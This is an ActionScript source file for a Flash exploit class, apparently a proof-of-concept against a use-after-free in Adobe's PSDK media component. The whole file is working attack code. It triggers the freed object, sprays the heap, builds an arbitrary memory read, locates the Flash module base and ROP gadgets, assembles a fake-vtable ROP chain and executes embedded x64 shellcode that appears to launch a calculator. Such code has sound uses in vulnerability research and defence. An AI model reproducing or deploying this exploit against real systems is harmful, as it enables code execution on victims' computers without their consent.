package {
	import com.adobe.mediacore.MediaResource;
	import com.adobe.mediacore.PSDK;
	import com.adobe.mediacore.metadata.Metadata;
	import com.adobe.mediacore.timeline.advertising.AdAsset;
	import com.adobe.mediacore.timeline.advertising.AdClick;
	
	import flash.display.Sprite;
	import flash.events.MouseEvent;
	import flash.text.TextField;
	import flash.utils.ByteArray;
	import flash.utils.Endian;
	
	public class exploit extends Sprite{
		public var output:String;
		public var ms:MediaResource;
		public var gc_arr:Array;
		public var fill_bytes:ByteArray;
		public var shellcode:ByteArray;
		public var mt:Metadata;
		public var txt:TextField;
		public var ps:PSDK;
		public function exploit()
		{	
			var button:Sprite = new Sprite();
			button.graphics.beginFill(0xFFCC00);
			button.graphics.drawRect(stage.stageWidth/2 - 20, 320, 40, 20);
			button.graphics.endFill();
			button.useHandCursor = true;
			button.buttonMode = true;
			button.mouseChildren = false;
			button.addEventListener(MouseEvent.CLICK, run);
			addChild(button);
			txt = new TextField();
			button.addChild(txt);
//			wrapper();
		}
		
		public function readmemory(ps:PSDK, address_high:uint ,address_low:uint):uint
		{	
			fill_bytes.position = 0x10; 
			fill_bytes.writeUnsignedInt(address_low);
			fill_bytes.writeUnsignedInt(address_high);
			mt.setByteArray("jack", fill_bytes);
			output = ms.url;
			if(output.length != 4)
			{
				var res:uint = output.charCodeAt(0);
				fill_bytes.position = 0x10;
				fill_bytes.writeUnsignedInt(address_low+1);
				mt.setByteArray("jack", fill_bytes);
				res+=ms.url.charCodeAt(0)<<8;
				fill_bytes.position = 0x10;
				fill_bytes.writeUnsignedInt(address_low+2);
				mt.setByteArray("jack", fill_bytes);
				res+=ms.url.charCodeAt(0)<<16;
				fill_bytes.position = 0x10;
				fill_bytes.writeUnsignedInt(address_low+3);
				mt.setByteArray("jack", fill_bytes);
				res+=ms.url.charCodeAt(0)<<24;
				return res;
			}
			else
			{
				return (output.charCodeAt(3)<<24) + (output.charCodeAt(2)<<16) + (output.charCodeAt(1)<<8) + (output.charCodeAt(0));				
			}
		}
		
		public function spray():void
		{
			gc_arr = new Array();
			var ad:AdClick = new AdClick("","","");
			for(var i:uint=0;i<0x80000;i++)
			{
				gc_arr[i]=new AdAsset("",1,ms,ad,mt);
			}
		}
		
		public function wrapper():void
		{	
			//Pepare the memory
			fill_bytes = new ByteArray();
			fill_bytes.endian = Endian.LITTLE_ENDIAN;
			fill_bytes.length = 0x30;
			fill_bytes.position = 0x08;
			fill_bytes.writeUnsignedInt(4);

			var shellstring:String = "\x50\x51\x52\x53\x56\x57\x55\x50\x6A\x60\x5A\x68\x63\x61\x6C\x63\x54\x59\x48\x29\xD4\x65\x48\x8B\x32\x48\x8B\x76\x18\x48\x8B\x76\x10\x48\xAD\x48\x8B\x30\x48\x8B\x7E\x30\x03\x57\x3C\x8B\x5C\x17\x28\x8B\x74\x1F\x20\x48\x01\xFE\x8B\x54\x1F\x24\x0F\xB7\x2C\x17\x8D\x52\x02\xAD\x81\x3C\x07\x57\x69\x6E\x45\x75\xEF\x8B\x74\x1F\x1C\x48\x01\xFE\x8B\x34\xAE\x48\x01\xF7\x99\xFF\xD7\x48\x83\xC4\x70\x5D\x5F\x5E\x5B\x5A\x59\x58\xC3";
			shellcode = new ByteArray();
			shellcode.length = 0x11000;
			shellcode.writeMultiByte(shellstring, "iso-8859-1");
			shellcode.position = 0;
			mt = new Metadata();			
			mt.setByteArray("shellc0de", shellcode);

			//trigger the uaf
			ps = PSDK.pSDK;
			var bytes:ByteArray = new ByteArray();
			bytes.endian = "littleEndian";
			bytes.position = 0x30;
			bytes.writeInt(1);
			mt.setByteArray("jack", bytes);
			ps.release();
			ms = new MediaResource("jack", 0x54336677, null);
			try{
				ps.createDefaultContentFactory();
			}catch(e:Error){}
			spray();
			
			//find metadata object
//			var base_low:uint = 0x09400000; // non protect
			var base_low:uint = 0x098e0000;  //protect
			var base_high:uint = 0;			
			while(readmemory(ps, base_high, base_low)!=0x54336677)
			{
				base_low += 4;	
			}
			base_low += 11*8;
			var mtaddr_low:uint = readmemory(ps, base_high, base_low);
			var mtaddr_high:uint = readmemory(ps, base_high, base_low+4);
			
			//find flash base
			var flashbase_low:uint = readmemory(ps, mtaddr_high, mtaddr_low) & 0xffff0000;
			var flashbase_high:uint = readmemory(ps, mtaddr_high, mtaddr_low+4);
			while(readmemory(ps, flashbase_high, flashbase_low)!=0x00905a4d)
				flashbase_low-=0x10000;
			ps["toString"]();
			//4a 94 31 ff 48 83 c4 20 5d c3
			//find gadget
			base_low = flashbase_low+0x1000;
			var flag:uint = 0;
			var memory_rx_func:uint = 0;
			var stackpivot:uint = 0;
			var poprcx:uint = 0;
			var value:uint;
			while(flag!=0x111)
			{
				value = readmemory(ps, base_high, base_low);
				if(value==0xf0518b48)
				{
					if(readmemory(ps, base_high, base_low+4)==0xf8498b48)
					{
						flag|=0x100;						
						memory_rx_func = base_low;
					}
				}
				else if(value==0xff31944a) //xchg rax, rsp ; xor edi, edi ; add rsp, 0x20 ; pop rbp ; ret
				{
					flag|=0x10;
					stackpivot = base_low;
				}
				
				else if((value&0xFFFF)==0xc359) // pop rcx ; ret
				{
					flag|=0x1;
					poprcx = base_low;
				}
				base_low++;
			}
			
			ps["toString"]();
			//find buffer
			//poi(poi(poi(poi(00000000063bde10 +90*2)+3*8)+2*8)+3*8)
			base_low = mtaddr_low;
			base_high = mtaddr_high;			
			base_low+= 0x90*2;
			base_low = readmemory(ps, base_high, base_low);
			base_low+=4*8;
			base_low = readmemory(ps, base_high, base_low);
			base_low+=2*8;
			base_low = readmemory(ps, base_high, base_low);
			base_low+=3*8;
			base_low = readmemory(ps, base_high, base_low);			
			var buffer_low:uint = base_low;
			var buffer_high:uint = base_high;
			
			ps["toString"]();
			//param
			var param:ByteArray = new ByteArray();
			param.endian = Endian.LITTLE_ENDIAN;
			param.writeUnsignedInt(0x10000);
			param.writeUnsignedInt(0x0);
			param.writeUnsignedInt(buffer_low & 0xffff0000);
			param.writeUnsignedInt(buffer_high);
			param.writeUnsignedInt(0x0);
			param.writeUnsignedInt(0x0);
			mt.setByteArray("param", param);
			base_low = mtaddr_low;
			base_high = mtaddr_high;			
			base_low+= 0x90*2;
			base_low = readmemory(ps, base_high, base_low);
			base_low+=0*8;
			base_low = readmemory(ps, base_high, base_low);
			base_low+=2*8;
			base_low = readmemory(ps, base_high, base_low);
			base_low+=3*8;
			base_low = readmemory(ps, base_high, base_low);			
			var param_low:uint = base_low;
			var param_high:uint = base_high;
			ps["toString"]();
			
			//vtable
			var vtablearr:ByteArray = new ByteArray();
			vtablearr.endian = Endian.LITTLE_ENDIAN;
			vtablearr.position = 8;
			//ropchain
			vtablearr.writeUnsignedInt(stackpivot);
			vtablearr.writeUnsignedInt(flashbase_high);
			vtablearr.writeUnsignedInt(0);
			vtablearr.writeUnsignedInt(0);
			vtablearr.writeUnsignedInt(0);
			vtablearr.writeUnsignedInt(0);
			vtablearr.writeUnsignedInt(0);
			vtablearr.writeUnsignedInt(0);
			vtablearr.writeUnsignedInt(poprcx);
			vtablearr.writeUnsignedInt(flashbase_high);
			vtablearr.writeUnsignedInt(param_low+2*8);
			vtablearr.writeUnsignedInt(param_high);
			vtablearr.writeUnsignedInt(memory_rx_func);
			vtablearr.writeUnsignedInt(flashbase_high);
			vtablearr.writeUnsignedInt(buffer_low);
			vtablearr.writeUnsignedInt(buffer_high);
			mt.setByteArray("vtable", vtablearr);
			
			base_low = mtaddr_low;
			base_high = mtaddr_high;			
			base_low+= 0x90*2;
			base_low = readmemory(ps, base_high, base_low);
			base_low+=3*8;
			base_low = readmemory(ps, base_high, base_low);
			base_low+=2*8;
			base_low = readmemory(ps, base_high, base_low);
			base_low+=3*8;
			base_low = readmemory(ps, base_high, base_low);			
			var vtable_low:uint = base_low;
			var vtable_high:uint = base_high;
			
			fill_bytes.position = 8;			
			fill_bytes.writeUnsignedInt(vtable_low);
			fill_bytes.writeUnsignedInt(vtable_high);			
			ps = PSDK.pSDK;
			ps.release();
			mt.setByteArray("jack", fill_bytes);
			ps["toString"]();
		}
			
		public function run(e:MouseEvent):void
		{						
			//var worker:Worker = WorkerDomain.current.createWorker(loaderInfo.bytes, true);
			//worker.start();
			wrapper();
		}
	}
}